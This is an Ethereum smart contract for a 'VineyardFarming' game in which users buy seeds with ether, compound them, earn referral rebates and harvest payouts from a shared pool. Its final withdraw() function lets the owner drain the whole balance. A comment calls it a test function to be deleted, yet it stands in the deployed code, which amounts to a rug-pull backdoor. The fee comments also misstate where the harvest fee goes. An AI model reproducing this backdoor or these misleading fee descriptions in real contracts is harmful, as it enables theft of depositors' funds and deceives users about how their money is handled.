/**
 *Submitted for verification at Etherscan.io on 2022-09-04
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

contract VineyardFarming {
    // constants
    uint256 constant VINEYARD_GROWING = 1728000;
    uint256 constant PSN = 2;
    uint256 constant PSNH = 1;

    // attributes
    uint256 public marketSeeds;
    uint256 public startTime = 2661830504772;
    address public owner;
    address public address2;

    mapping(address => uint256) private lastSeeding;
    mapping(address => uint256) private seededseeds;

    mapping(address => uint256) private claimedSeeds;
    mapping(address => uint256) private tempclaimedSeeds;
    mapping(address => address) private referrals;
    mapping(address => ReferralData) private referralData;

    // structs
    struct ReferralData {
        address[] invitees;
        uint256 rebates;
    }

    // modifiers
    modifier onlyOwner() {
        require(msg.sender == owner, 'not owner');
        _;
    }

    modifier onlyOpen() {
        require(block.timestamp > startTime, 'not open');
        _;
    }

    modifier onlyStartOpen() {
        require(marketSeeds > 0, 'not start open');
        _;
    }

    // events
    event Buy(address indexed user, uint256 indexed amount);
    event Hardvest(address indexed user, uint256 indexed amount);

    constructor() {
        owner = msg.sender;
    }

    function setStartTime(uint256 _startTime) external payable onlyOwner {
        require(marketSeeds == 0);
        startTime = _startTime;
        marketSeeds = 108000000000;
    }

    function getClaimSeeds(address _address) public view returns (uint256) {
        return claimedSeeds[_address];
    }

    function getTempclaimedSeeds(address _address) public view returns (uint256) {
        return tempclaimedSeeds[_address];
    }

    function getPoolBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function getSeededSeeds(address _address) public view returns (uint256) {
        return seededseeds[_address];
    }

    function getReferralData(address _address) public view returns (ReferralData memory) {
        return referralData[_address];
    }

    function getReferralAllRebate(address _address) public view returns (uint256) {
        return referralData[_address].rebates;
    }

    function getReferralAllInvitee(address _address) public view returns (uint256) {
        return referralData[_address].invitees.length;
    }

    function getMySeeds(address _address) public view returns (uint256) {
        return claimedSeeds[_address] + getSeedsSinceLastSeeded(_address);
    }

    function buySeeds(address _ref) external payable onlyStartOpen {
        uint256 seedAmount = calculateBuySeedAmount(msg.value, address(this).balance - msg.value);

        // dev fee is 5% , only 3% for developer team , the other 2% back to the pool
        seedAmount -= devFee(seedAmount);
        uint256 fee = devFee(msg.value);

        (bool Success, ) = owner.call{ value: (fee * 60) / 100 }('');
        require(Success, 'Owner Payment Failed');

        claimedSeeds[msg.sender] += seedAmount;
        seed(_ref);

        emit Buy(msg.sender, msg.value);
    }

    function seed(address _ref) public onlyStartOpen {
        if (_ref == msg.sender || _ref == address(0) || seededseeds[_ref] == 0) {
            _ref = owner;
        }

        if (referrals[msg.sender] == address(0)) {
            referrals[msg.sender] = _ref;
            referralData[_ref].invitees.push(msg.sender);
        }

        uint256 mySeeds = getMySeeds(msg.sender);
        uint256 newSeeds = mySeeds / VINEYARD_GROWING;
        seededseeds[msg.sender] += newSeeds;
        claimedSeeds[msg.sender] = 0;
        lastSeeding[msg.sender] = block.timestamp;

        // referral
        uint256 referralReward = (mySeeds * 13) / 100;
        if (referrals[msg.sender] == owner) {
            claimedSeeds[owner] += referralReward;
            tempclaimedSeeds[owner] += referralReward;
        } else {
            claimedSeeds[referrals[msg.sender]] += referralReward;
            tempclaimedSeeds[referrals[msg.sender]] += referralReward;
        }

        marketSeeds += mySeeds / 5;
    }

    function harvest() external onlyOpen {
        uint256 mySeeds = getMySeeds(msg.sender);

        uint256 hardvestReward = calculateHarvest(mySeeds);
        uint256 fee = devFee(hardvestReward);
        uint256 realReward = hardvestReward - fee;

        if (tempclaimedSeeds[msg.sender] > 0) {
            referralData[msg.sender].rebates += calculateHarvest(tempclaimedSeeds[msg.sender]);
        }
        // dev fee
        (bool ownerSuccess, ) = owner.call{ value: fee }('');
        require(ownerSuccess, 'Owner Payment Failed');

        claimedSeeds[msg.sender] = 0;
        tempclaimedSeeds[msg.sender] = 0;
        lastSeeding[msg.sender] = block.timestamp;
        marketSeeds += mySeeds;

        (bool UserSuccess, ) = msg.sender.call{ value: realReward }('');
        require(UserSuccess, 'User Payment Failed');

        emit Hardvest(msg.sender, realReward);
    }

    function harvestRewards(address _address) public view returns (uint256) {
        return calculateHarvest(getMySeeds(_address));
    }

    ///@dev the fruits amount that seeds generated
    function getSeedsSinceLastSeeded(address _address) public view returns (uint256) {
        if (block.timestamp > startTime) {
            uint256 secondsPassed = block.timestamp - lastSeeding[_address];
            return secondsPassed * seededseeds[_address];
        } else {
            return 0;
        }
    }

    ///@dev according to the user payment to calculate the seeds
    function calculateBuySeedAmount(uint256 _balance, uint256 _contractBalance) private view returns (uint256) {
        return calculateFormula(_balance, _contractBalance, marketSeeds);
    }

    ///@dev according to the seeds amount to calculate the reward
    function calculateHarvest(uint256 seed) public view returns (uint256) {
        return calculateFormula(seed, marketSeeds, address(this).balance);
    }

    function calculateReward(address _owner) external view returns (uint256) {
        uint256 mySeeds = getMySeeds(_owner);
        uint256 hardvestReward = calculateHarvest(mySeeds);
        uint256 fee = devFee(hardvestReward);
        return hardvestReward - fee;
    }

    function calculateFormula(
        uint256 rt,
        uint256 rs,
        uint256 bs
    ) private pure returns (uint256) {
        return (PSN * bs) / (PSNH + ((PSN * rs + PSNH * rt) / rt));
    }

    ///@dev total fee is 5%, 3% to the dev team , 2% back to the pool
    function devFee(uint256 _amount) private pure returns (uint256) {
        return (_amount * 5) / 100;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    ///NOTE:when test finish, should delete this
    function withdraw() external onlyOwner {
        (bool success, ) = msg.sender.call{ value: address(this).balance }('');
        require(success, 'Withdraw Failed');
    }
}